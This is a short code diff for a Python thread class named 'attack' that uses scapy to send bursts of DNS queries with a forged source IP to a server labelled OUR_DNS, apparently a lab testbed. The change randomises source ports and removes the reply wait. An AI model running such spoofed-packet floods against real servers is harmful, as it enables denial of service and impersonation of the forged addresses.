@@ -141,8 +141,8 @@ class attack(Thread):
         elif self._type == 1:
             for i in range(randint(30,40)):
                 l_qname = 'somedomain.com'
-                dns_req = IP(src=self._ip, dst=OUR_DNS)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=l_qname))
-                _ = sr1(dns_req, timeout=1, verbose=0)
+                dns_req = IP(src=self._ip, dst=OUR_DNS)/UDP(dport=53, sport=RandShort())/DNS(rd=1, qd=DNSQR(qname=l_qname))
+                _ = sr1(dns_req, timeout=0, verbose=0)
         else:
             pass
 
